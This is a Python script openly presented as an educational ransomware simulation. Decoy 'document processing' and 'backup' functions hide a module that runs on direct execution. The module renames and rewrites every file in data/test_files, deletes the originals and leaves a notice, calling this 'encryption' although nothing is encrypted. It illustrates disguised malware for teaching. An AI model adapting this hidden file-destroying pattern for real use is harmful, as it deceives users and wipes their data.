#!/usr/bin/env python3
"""
LEGITIMATE-LOOKING PYTHON SCRIPT
This appears to be a normal Python utility file.
When executed, it will encrypt files in the target directory.
Educational purposes only!
"""

# This looks like normal Python code
def process_documents():
    """Process document files - appears legitimate"""
    print("Processing document files...")
    print("Analyzing content...")
    print("Generating reports...")
    return "Document processing complete"

def backup_files():
    """Backup utility function - appears legitimate"""
    print("Backing up files...")
    print("Creating archive...")
    print("Backup completed successfully")
    return True

# HIDDEN RANSOMWARE CODE - Only executes when run directly
def hidden_encryption_module():
    """Hidden module that activates on direct execution"""
    import os
    import time
    from pathlib import Path
    
    print("=" * 50)
    print("WARNING: EDUCATIONAL RANSOMWARE MODULE ACTIVATED")
    print("=" * 50)
    print("This file contains embedded encryption functionality!")
    print("Target Directory: data/test_files")
    print("Educational demonstration only.")
    print("=" * 50)
    
    target_dir = Path("data/test_files")
    if target_dir.exists():
        print(f"[TARGET] Encrypting files in: {target_dir}")
        time.sleep(1)
        
        encrypted_count = 0
        for file_path in target_dir.rglob("*"):
            if (file_path.is_file() and 
                not file_path.name.endswith(".legit_py") and
                "NOTICE" not in file_path.name.upper()):
                
                try:
                    # Read original file
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    # Create "encrypted" version
                    new_name = str(file_path) + ".legit_py"
                    with open(new_name, 'wb') as f:
                        f.write(b"# LEGITIMATE PYTHON RANSOMWARE SIMULATION\n")
                        f.write(b"# Educational security research\n")
                        f.write(b"========================================\n")
                        f.write(data)
                    
                    # Remove original file
                    file_path.unlink()
                    encrypted_count += 1
                    print(f"[ENCRYPTED] {file_path.name}")
                    
                except Exception as e:
                    print(f"[ERROR] {file_path.name}: {e}")
        
        # Create educational notice
        notice = f"""===============================================
    LEGITIMATE PYTHON RANSOMWARE SIMULATION
===============================================

This Python file contained hidden encryption code
that activated when executed directly.

Target Directory: data/test_files
Files Encrypted: {encrypted_count}
Extension Added: .legit_py

This demonstrates how legitimate-looking files
can contain hidden malicious functionality.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
"""
        
        notice_path = target_dir / "LEGITIMATE_PYTHON_NOTICE.txt"
        with open(notice_path, 'w') as f:
            f.write(notice)
        
        print(f"[NOTE] Created notice: {notice_path.name}")
        print(f"\n[COMPLETE] Encrypted {encrypted_count} files")
        print("Educational demonstration complete.")
        
    else:
        print(f"[ERROR] Target directory not found: {target_dir}")

# EXECUTION CONTROL - Determines when hidden code runs
if __name__ == "__main__":
    # When run directly, execute hidden encryption
    hidden_encryption_module()
else:
    # When imported, show normal functionality
    print("Python utility module loaded")
    print("Available functions: process_documents(), backup_files()")